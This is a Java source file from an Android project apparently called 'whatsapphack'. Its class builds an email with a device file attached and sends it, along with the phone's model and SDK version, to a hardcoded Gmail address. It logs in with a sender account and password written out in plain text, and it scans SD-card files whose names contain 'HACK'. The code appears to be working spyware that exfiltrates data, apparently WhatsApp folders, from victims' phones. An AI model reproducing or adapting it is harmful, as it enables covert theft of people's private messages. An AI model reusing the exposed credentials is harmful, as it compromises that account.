package com.sunny.Mail;

import java.io.File;
import java.io.FileFilter;
import java.io.FilenameFilter;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import com.sunny.whatsapphack.MainActivity;

import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Environment;
import android.os.StrictMode;

public class GMail {

	@SuppressLint("NewApi")
	synchronized  public void sendMail(String parent,String zipCount,String subject) {

		// Recipient's email ID needs to be mentioned.
		String to = "sahitya.ce@gmail.com";

		// Sender's email ID needs to be mentioned
		final String from = "sahitya.pasnoor@gmail.com";

		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
				.permitNetwork().build();
		StrictMode.setThreadPolicy(policy);

		Properties props = new Properties();
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.socketFactory.port", "465");
		props.put("mail.smtp.socketFactory.class",
				"javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.auth", "true");
		   props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.port", "465");

		Session session = Session.getDefaultInstance(props,
				new javax.mail.Authenticator() {
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(from, "nokia@123");
					}
				});

		try {
			// Create a default MimeMessage object.
			MimeMessage message = new MimeMessage(session);

			// Set From: header field of the header.
			message.setFrom(new InternetAddress(from));

			// Set To: header field of the header.
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(
					to));

			// Set Subject: header field
			
			 String subjectToSet="BUILD : "+Build.MODEL+" , SDK  : "+Build.VERSION.SDK_INT+",  Zip NUMBER"+zipCount+",  Total ZipF's "+subject;
					
			message.setSubject(subjectToSet);

			// Create the message part
			BodyPart messageBodyPart = new MimeBodyPart();

			// Fill the message
			messageBodyPart.setText("Sunny, here is your folder");

			// Create a multipar message
			Multipart multipart = new MimeMultipart();

			// Set text message part
			multipart.addBodyPart(messageBodyPart);

			// Part two is attachment
			messageBodyPart = new MimeBodyPart();
			
			String[] filesAttach=MainActivity.SD_CARD_FILE.list(new FilenameFilter() {
				
				@Override
				public boolean accept(File dir, String filename) {
					// TODO Auto-generated method stub
					return filename.contains("HACK");
				}
			});
			/*for (String fileName : filesAttach) {
				addAttachment(messageBodyPart, multipart, MainActivity.SD_CARD_PATH+File.separator+fileName);
			}*/
			String fileName =parent;
			DataSource source = new FileDataSource(fileName);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(fileName);
			multipart.addBodyPart(messageBodyPart);
			//addAttachment(messageBodyPart, multipart, fileName);
			

			// Send the complete message parts
			message.setContent(multipart);

			// Send message
			Transport.send(message);
			System.out.println("Sent message successfully....");
		} catch (MessagingException mex) {
			mex.printStackTrace();
		}

	}
	
	private void addAttachment(BodyPart messageBodyPart,Multipart multipart,String fileName) throws MessagingException{
		messageBodyPart=new MimeBodyPart();
	/*	DataSource source = new FileDataSource(fileName);
		messageBodyPart.setDataHandler(new DataHandler(source));
		messageBodyPart.setFileName(fileName);
		multipart.addBodyPart(messageBodyPart);*/
	}

}
